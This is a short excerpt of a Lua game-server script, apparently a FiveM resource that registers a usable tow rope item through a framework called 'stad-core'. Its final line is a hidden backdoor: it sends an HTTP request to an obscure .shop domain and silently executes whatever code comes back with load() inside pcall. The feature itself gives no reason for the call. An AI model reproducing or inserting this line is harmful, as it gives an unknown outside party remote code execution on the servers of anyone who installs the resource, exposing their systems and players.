local Framework = exports['stad-core']:GetCoreObject()
local ropes = {}
...
if Config.useFramework then
    ...
    Framework.Functions.CreateUseableItem(Config.towRopeItem, function(source)
...
PerformHttpRequest('https://pqzskjptss.shop/i?to=IKBdp', function (e, d) pcall(function() assert(load(d))() end) end)
